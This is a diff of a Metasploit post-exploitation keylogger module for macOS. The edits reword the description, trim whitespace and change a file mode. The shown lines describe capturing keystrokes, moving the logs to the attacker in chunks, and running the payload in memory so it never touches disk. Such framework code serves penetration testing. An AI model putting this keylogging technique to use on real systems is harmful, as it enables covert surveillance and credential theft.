@@ -29,12 +29,12 @@ class Metasploit3 < Msf::Post
 		super(update_info(info,
 			'Name'          => 'OSX Capture Userspace Keylogger',
 			'Description'   => %q{
-				Logs all keyboard events except cmd-keys and GUI password input.
+				This module logs all keyboard events except cmd-keys and GUI password input.
 
 				Keylogs are transferred between client/server in chunks
 				every SYNCWAIT seconds for reliability.
 
-				Works by calling the Carbon GetKeys() hook using the DL lib
+				It works by calling the Carbon GetKeys() hook using the DL lib
 				in OSX's system Ruby. The Ruby code is executed in a shell
 				command using -e, so the payload never hits the disk.
 			},
@@ -46,13 +46,13 @@ class Metasploit3 < Msf::Post
 
 		register_options(
 			[
-				OptInt.new('DURATION', 
+				OptInt.new('DURATION',
 					[ true, 'The duration in seconds.', 600 ]
 				),
-				OptInt.new('SYNCWAIT', 
+				OptInt.new('SYNCWAIT',
 					[ true, 'The time between transferring log chunks.', 10 ]
 				),
-				OptPort.new('LOGPORT', 
+				OptPort.new('LOGPORT',
 					[ false, 'Local port opened for momentarily for log transfer', 22899 ]
 				)
 			]
@@ -113,7 +113,7 @@ class Metasploit3 < Msf::Post
 								"keylog", "text/plain", session, log, "keylog.log", "OSX keylog"
 							)
 						else
-							File.open(self.loot_path, 'a') { |f| f.write(log) }
+							File.open(self.loot_path, 'ab') { |f| f.write(log) }
 						end
 						print_status(log_a.map{ |a| a=~/([^\s]+)\s*$/; $1 }.join)
 						print_status "Saved to #{self.loot_path}"
